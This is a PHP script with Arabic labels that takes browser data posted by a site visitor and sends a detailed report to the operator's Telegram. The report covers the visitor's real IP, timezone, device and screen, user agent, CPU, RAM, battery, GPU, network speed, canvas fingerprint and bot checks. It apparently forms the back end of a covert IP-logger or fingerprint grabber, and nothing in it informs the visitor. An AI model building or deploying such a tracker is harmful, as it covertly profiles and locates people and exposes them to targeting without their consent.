<?php
require_once 'config.php';
require_once 'telegram.php';

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    // جلب الـ IP الحقيقي
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ip = explode(',', $ip)[0];
    date_default_timezone_set('Africa/Cairo');
    $time = date('Y-m-d h:i:s A');

    $msg = "🎯 <b>تقرير دخول مفصل</b>\n";
    $msg .= "━━━━━━━━━━━━\n";
    
    $msg .= "🌐 <b>أساسيات:</b>\n";
    $msg .= "• الـ IP: <code>$ip</code>\n";
    $msg .= "• الوقت: $time\n";
    $msg .= "• التوقيت: {$data['timezone']} ({$data['tzOffset']})\n\n";

    $msg .= "📱 <b>بيئة الجهاز:</b>\n";
    $msg .= "• النوع: {$data['deviceType']}\n";
    $msg .= "• المنصة: {$data['platform']}\n";
    $msg .= "• الشاشة الحقيقية: {$data['realScreen']} (Ratio: {$data['pixelRatio']})\n";
    $msg .= "• مساحة العرض (Viewport): {$data['viewport']}\n";
    $msg .= "• عمق الألوان: {$data['colorDepth']}-bit\n\n";

    $msg .= "💻 <b>المتصفح:</b>\n";
    $msg .= "• اللغة الأساسية: {$data['primaryLang']}\n";
    $msg .= "• كل اللغات: {$data['allLangs']}\n";
    $msg .= "• الـ Vendor: {$data['vendor']}\n";
    $msg .= "• الـ User-Agent: <code>{$data['userAgent']}</code>\n\n";

    $msg .= "⚙️ <b>الهاردوير:</b>\n";
    $msg .= "• المعالج: {$data['cores']} Cores\n";
    $msg .= "• الرام التقريبي: {$data['ram']} GB\n";
    $msg .= "• البطارية: {$data['batteryLevel']} | {$data['isCharging']}\n";
    $msg .= "• كارت الشاشة (Renderer):\n<code>{$data['gpuRenderer']}</code>\n";
    $msg .= "• كارت الشاشة (Vendor): {$data['gpuVendor']}\n\n";

    $msg .= "📡 <b>الشبكة:</b>\n";
    $msg .= "• نوع الاتصال: {$data['connType']}\n";
    $msg .= "• السرعة التقريبية: {$data['downlink']}\n";
    $msg .= "• الـ Ping (RTT): {$data['rtt']}\n\n";

    $msg .= "🔍 <b>كشف التزوير والبوتات:</b>\n";
    $msg .= "• بصمة الكانفاس: <code>" . substr($data['canvasHash'], 0, 15) . "...</code>\n";
    $msg .= "• هل هو بوت (Webdriver): {$data['webdriver']}\n";
    $msg .= "• نقاط اللمس (Touch): {$data['touchPoints']}\n";
    $msg .= "• الكوكيز: {$data['cookiesEnabled']}\n\n";

    $msg .= "—\n";
    $msg .= "👨‍💻 <a href='https://t.me/" . DEV_USERNAME . "'>" . DEV_USERNAME . "</a>";

    sendTelegramMessage($msg);
}
?>
